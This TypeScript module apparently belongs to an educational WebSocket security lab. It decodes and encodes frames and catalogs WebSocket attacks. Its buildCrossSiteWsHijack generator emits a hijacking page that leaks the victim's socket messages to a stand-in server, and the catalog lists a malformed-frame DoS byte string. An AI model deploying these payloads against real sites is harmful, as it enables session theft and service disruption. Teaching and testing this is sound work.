/* WebSocket Attack Lab — decodificador de frames RFC 6455 100% local y
   generadores de cliente/ataques de laboratorio. */

export interface WsFrameInfo {
  ok: boolean
  error?: string
  fin: boolean
  rsv1: boolean
  rsv2: boolean
  rsv3: boolean
  opcode: number
  opcodeName: string
  masked: boolean
  maskKey: number[]
  payloadLen: number
  rawLenField: number
  extended: boolean
  payloadPreview: string
  hexDump: string
}

const OPCODE_NAMES: Record<number, string> = {
  0x0: 'Continuation', 0x1: 'Text', 0x2: 'Binary', 0x8: 'Close', 0x9: 'Ping', 0xA: 'Pong',
}

/* Decodifica un frame WebSocket desde hex (cliente→servidor con máscara, o
   servidor→cliente sin). Muestra cómo se oculta el payload bajo la máscara. */
export const decodeWsFrame = (hex: string): WsFrameInfo => {
  const empty: WsFrameInfo = {
    ok: false, fin: false, rsv1: false, rsv2: false, rsv3: false, opcode: 0, opcodeName: '',
    masked: false, maskKey: [], payloadLen: 0, rawLenField: 0, extended: false, payloadPreview: '', hexDump: '',
  }
  const clean = hex.replace(/[^0-9a-fA-F]/g, '')
  const bytes: number[] = []
  for (let i = 0; i < clean.length; i += 2) bytes.push(parseInt(clean.slice(i, i + 2), 16))
  const b = new Uint8Array(bytes)
  if (b.length < 2) return { ...empty, error: 'mínimo 2 bytes (FIN/RSV/opcode + len)' }
  const b0 = b[0]
  const b1 = b[1]
  const fin = !!(b0 & 0x80)
  const rsv1 = !!(b0 & 0x40)
  const rsv2 = !!(b0 & 0x20)
  const rsv3 = !!(b0 & 0x10)
  const opcode = b0 & 0x0f
  const masked = !!(b1 & 0x80)
  const rawLenField = b1 & 0x7f
  let off = 2
  let payloadLen = rawLenField
  let extended = false
  if (rawLenField === 126) {
    if (b.length < 4) return { ...empty, error: 'len 126 requiere 2 bytes extra' }
    payloadLen = (b[2] << 8) | b[3]
    off = 4
    extended = true
  } else if (rawLenField === 127) {
    if (b.length < 10) return { ...empty, error: 'len 127 requiere 8 bytes extra' }
    payloadLen = 0
    for (let i = 2; i < 10; i++) payloadLen = payloadLen * 256 + b[i]
    off = 10
    extended = true
  }
  let maskKey: number[] = []
  if (masked) {
    if (b.length < off + 4) return { ...empty, error: 'falta la mask key de 4 bytes' }
    maskKey = Array.from(b.subarray(off, off + 4))
    off += 4
  }
  if (payloadLen > 0 && b.length < off + payloadLen) {
    return { ...empty, error: `payload truncado: el frame declara ${payloadLen} bytes y llegan ${Math.max(0, b.length - off)}` }
  }
  const payload = b.subarray(off, Math.min(b.length, off + payloadLen))
  let payloadPreview = ''
  if (masked && maskKey.length === 4) {
    // demostración de unmasking: XOR con la key repetida
    const unmasked = Array.from(payload).map((x, i) => x ^ maskKey[i % 4])
    payloadPreview = printable(unmasked)
  } else {
    payloadPreview = printable(Array.from(payload))
  }
  const hexDump = Array.from(b.subarray(0, Math.min(b.length, 64)))
    .map((x) => x.toString(16).padStart(2, '0'))
    .join(' ')
  return {
    ok: true, fin, rsv1, rsv2, rsv3, opcode, opcodeName: OPCODE_NAMES[opcode] ?? `opcode ${opcode}`,
    masked, maskKey, payloadLen, rawLenField, extended, payloadPreview, hexDump,
  }
}

const printable = (arr: number[]): string =>
  Array.from(arr, (x) => (x >= 32 && x < 127 ? String.fromCharCode(x) : '.')).join('')

/* Genera el hex de un frame cliente→servidor enmascarado (para el lab):
   opcode text, payload ASCII, mask aleatoria fija (didáctica). */
export const encodeMaskedFrame = (payload: string, mask = [0x12, 0x34, 0x56, 0x78]): string => {
  const bytes: number[] = []
  bytes.push(0x81) // FIN + text
  const len = payload.length
  if (len < 126) bytes.push(0x80 | len)
  else if (len < 65536) {
    bytes.push(0x80 | 126, (len >> 8) & 0xff, len & 0xff)
  } else {
    bytes.push(0x80 | 127, 0, 0, 0, 0, (len >> 24) & 0xff, (len >> 16) & 0xff, (len >> 8) & 0xff, len & 0xff)
  }
  bytes.push(...mask)
  for (let i = 0; i < len; i++) bytes.push(payload.charCodeAt(i) ^ mask[i % 4])
  return bytes.map((x) => x.toString(16).padStart(2, '0')).join('')
}

/* ─── generador de cliente de laboratorio ─── */

export const buildWsClient = (url: string, sendMsg: string): string =>
  [
    '<!-- Cliente WebSocket de laboratorio: sirve este HTML desde TU servidor',
    '     (http://localhost:8080) y prueba TU endpoint WebSocket autorizado. -->',
    '<script>',
    `const ws = new WebSocket(${JSON.stringify(url || 'wss://target.com/ws')});`,
    'ws.onopen = () => {',
    `  console.log('[+] conectado');`,
    `  ws.send(${JSON.stringify(sendMsg || '{"action":"subscribe","channel":"general"}')});`,
    '};',
    'ws.onmessage = (e) => console.log("[<]", e.data);',
    'ws.onclose = (e) => console.log("[-] cerrado", e.code, e.reason);',
    'ws.onerror = (e) => console.log("[!]", e);',
    '</script>',
  ].join('\n')

export const buildCrossSiteWsHijack = (url: string, msg: string): string =>
  [
    '<!-- CSWSH: el navegador VICTIMA auto-envía sus cookies (no hay SameSite',
    '     para WebSockets en muchos stacks). Si el servidor no valida Origin,',
    '     el WebSocket se establece con la sesión de la víctima. -->',
    '<script>',
    `const ws = new WebSocket(${JSON.stringify(url || 'wss://target.com/ws')});`,
    'ws.onopen = () => ws.send(' + JSON.stringify(msg || '{"action":"list","resource":"invoices"}') + ');',
    'ws.onmessage = (e) => fetch("https://TU-SERVIDOR.com/leak?d=" + encodeURIComponent(e.data));',
    '</script>',
  ].join('\n')

/* ─── ataques ─── */

export interface WsAttack {
  id: string
  name: string
  difficulty: 'trivial' | 'media' | 'alta'
  how: string
  payloadHint: string
  detect: string
}

export const WS_ATTACKS: WsAttack[] = [
  {
    id: 'cswsh',
    name: 'Cross-Site WebSocket Hijacking',
    difficulty: 'trivial',
    how: 'El handshake es un GET con cookies: si el servidor no valida el header Origin, una web maliciosa abre el WS con la sesión de la víctima y lee/escribe como ella. No hay SameSite que lo parezca (el handshake es GET top-level).',
    payloadHint: 'Sirve el HTML del generador desde TU servidor con la víctima logueada al target: si el mensaje llega, no validan Origin.',
    detect: 'Mensaje de la víctima llega a TU servidor OOB: CSWSH confirmado.',
  },
  {
    id: 'no-tls',
    name: 'WS sin TLS (ws://)',
    difficulty: 'trivial',
    how: 'ws:// viaja en claro: cualquier punto de red (wifi ajena, proxy corporativo) lee y modifica mensajes en vivo.',
    payloadHint: 'Busca ws:// en el frontend y en las llamadas: debe ser siempre wss://.',
    detect: 'tcpdump/mitm sobre la red muestra los mensajes en claro.',
  },
  {
    id: 'msg-tamper',
    name: 'Manipulación de mensajes (sin firma)',
    difficulty: 'media',
    how: 'Si las acciones del protocolo (price, recipient, action) no se revalidan server-side, modificar el mensaje en Repeater/WebSocket Plaza cambia la lógica: el cliente NO es de confianza.',
    payloadHint: 'Intercepta el mensaje {action:"buy","price":100} y cambia price:1: si acepta, la validación vive en el frontend.',
    detect: 'El servidor ejecuta la acción manipulada.',
  },
  {
    id: 'auth-bypass',
    name: 'Auth solo en el handshake',
    difficulty: 'media',
    how: 'Muchos sockets autentican al conectar y NUNCA más: si el token expira o el usuario pierde permisos, el socket sigue vivo. Además, mensajes de admin a veces solo se filtran del cliente.',
    payloadHint: 'Conéctate como user, luego desde admin bloquea al user: tu socket abierto sigue recibiendo eventos de admin si no re-validan.',
    detect: 'Eventos privilegiados siguen llegando tras perder el permiso.',
  },
  {
    id: 'origin-spoof',
    name: 'Origin suplantado (no navegador)',
    difficulty: 'media',
    how: 'El header Origin es trivial de falsificar fuera de un navegador (curl/python): si confían en él para auth, cualquier cliente no-navegador entra.',
    payloadHint: 'curl con -H "Origin: https://target.com" al endpoint del WS: si responde 101, el Origin no es una barrera real.',
    detect: 'Handshake 101 con Origin inventado desde un cliente no-navegador.',
  },
  {
    id: 'ping-flood',
    name: 'DoS con frames malformados',
    difficulty: 'trivial',
    how: 'Un frame con length declarado enorme sin payload, opcodes reservados o RSUs inventadas craban parsers no robustos (implementaciones caseras).',
    payloadHint: 'Envía bytes: 82 7f 7f ff ff ff ff ff ff ff ff (len gigante) y mira si el servidor muere.',
    detect: 'Cierre anormal del socket o CPU al 100% en el servidor.',
  },
]
